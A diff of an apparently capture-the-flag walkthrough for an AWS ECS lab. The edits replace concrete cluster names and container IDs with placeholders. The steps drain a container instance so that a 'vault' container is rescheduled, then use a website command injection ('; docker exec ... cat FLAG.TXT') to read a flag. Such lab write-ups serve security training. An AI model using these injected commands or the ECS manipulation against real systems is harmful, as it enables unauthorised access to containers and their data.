@@ -22,13 +22,13 @@
 
    ```
    aws ecs list-clusters --profile privd
-   tasks=$(aws ecs list-tasks --cluster my-cluster --profile ecs --query taskArns --out text)
-   aws ecs describe-tasks --cluster my-cluster --profile ecs --tasks $tasks --query 'tasks[].[taskDefinitionArn, taskArn, containerInstanceArn]' --out text
+   tasks=$(aws ecs list-tasks --cluster <my-cluster> --profile ecs --query taskArns --out text)
+   aws ecs describe-tasks --cluster <my-cluster> --profile ecs --tasks $tasks --query 'tasks[].[taskDefinitionArn, taskArn, containerInstanceArn]' --out text
    ```
 
 6. Set the container instance that is running the vault container to DRANING
 
-    `aws ecs update-container-instances-state --cluster my-cluster --container-instances <> --status DRAINING`
+    `aws ecs update-container-instances-state --cluster <my-cluster> --container-instances <target-instance> --status DRAINING`
 
 9. Wait for "Vault" container to be rescheduled, this can be checked by running docker via command injection.
 
@@ -37,6 +37,6 @@
 10. Using the command injection on the website get the flag from the "vault" container.
 
     ```
-    ; docker exec 8e9be4ebf17b ls
-    ; docker exec 8e9be4ebf17b cat FLAG.TXT
+    ; docker exec <container id> ls
+    ; docker exec <container id> cat FLAG.TXT
     ```
